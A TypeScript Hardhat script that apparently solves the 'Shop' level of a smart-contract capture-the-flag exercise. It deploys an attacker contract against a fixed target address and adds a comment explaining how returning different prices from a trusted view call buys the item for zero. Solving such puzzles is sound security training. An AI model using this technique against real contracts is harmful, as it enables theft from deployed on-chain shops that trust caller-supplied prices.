import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/21.Shop/Shop.sol/Shop.json";
import { Contract } from "ethers";
import { displayResult } from "../../utils/displayResult";
import { deployContract } from "../../utils/deployContract";

const targetAddress = "0xeA1B16Db93b4c96858CA4B2A611ED829d4b905cE";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  const shopAttacker = await deployContract("ShopAttacker", attacker, [
    target.address,
  ]);

  const tx = await shopAttacker.attack();
  await tx.wait();
  displayResult(await target.isSold());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/*  Explanation of the code:
    Here the shop trusts us for the _buyer.price() call.
    So for the first call we will give him the price he wants --> 100
    For the second call we will give him the price we wants --> 0
    Since it's a view function, we can't use a local variable to update where 
    we are in the operation but since the caller update isSold variable in his 
    contract and it's a public variable we can track our progress.
*/
